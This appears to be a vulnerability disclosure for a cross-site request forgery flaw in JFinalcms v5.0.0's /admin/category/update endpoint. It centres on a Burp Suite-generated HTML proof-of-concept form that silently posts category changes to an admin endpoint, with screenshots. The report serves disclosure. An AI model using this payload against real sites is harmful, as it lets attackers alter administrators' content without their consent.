target:https://gitee.com/heyewei/JFinalcms

version:v5.0.0

JFinalcms v5.0.0 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /admin/category/update


![图片](https://github.com/nightcloudos/new_cms/assets/76925342/3f42daad-6487-4fe8-b65c-6ce2e60a5f72)

create poc

![图片](https://github.com/nightcloudos/new_cms/assets/76925342/764d57a4-7407-4ccd-a6b3-dafcf244bcbf)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:8888/admin/category/update" method="POST">
      <input type="hidden" name="id" value="1125" />
      <input type="hidden" name="name" value="cs123" />
      <input type="hidden" name="parentId" value="" />
      <input type="hidden" name="modelId" value="5" />
      <input type="hidden" name="listTemplate" value="case&#95;list&#46;html" />
      <input type="hidden" name="detailTemplate" value="case&#95;detail&#46;html" />
      <input type="hidden" name="cat" value="cs" />
      <input type="hidden" name="code" value="cs" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="introduction" value="" />
      <input type="hidden" name="subname" value="" />
      <input type="hidden" name="remark" value="" />
      <input type="hidden" name="outlink" value="" />
      <input type="hidden" name="ico" value="" />
      <input type="hidden" name="file" value="" />
      <input type="hidden" name="image" value="" />
      <input type="hidden" name="file" value="" />
      <input type="hidden" name="title" value="" />
      <input type="hidden" name="keywords" value="" />
      <input type="hidden" name="description" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

successed

![图片](https://github.com/nightcloudos/new_cms/assets/76925342/a7685ca5-8fd6-47e3-a422-33783f78ac0b)
